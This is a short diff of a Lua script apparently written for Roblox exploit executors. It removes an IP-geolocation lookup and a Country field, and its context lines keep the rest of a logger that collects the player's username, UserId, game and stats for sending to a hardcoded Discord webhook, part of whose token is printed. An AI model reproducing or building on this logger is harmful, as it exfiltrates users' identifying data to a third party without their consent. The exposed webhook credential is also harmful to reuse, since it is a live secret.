@@ -10,14 +10,6 @@ local webhook = "https://discord.com/api/webhooks/1487713250496745492/5UB6aG1usM
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
-local country = "Unknown"
-pcall(function()
-	local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-	if data and data.country then
-		country = data.country
-	end
-end)
-
 local strength, rebirths, gems, steps = "Unknown","Unknown","Unknown","Unknown"
 
 pcall(function()
@@ -46,7 +38,6 @@ local data = {
 		["fields"] = {
 			{["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
 			{["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
-			{["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
 			{["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
 			{["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
 			{["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
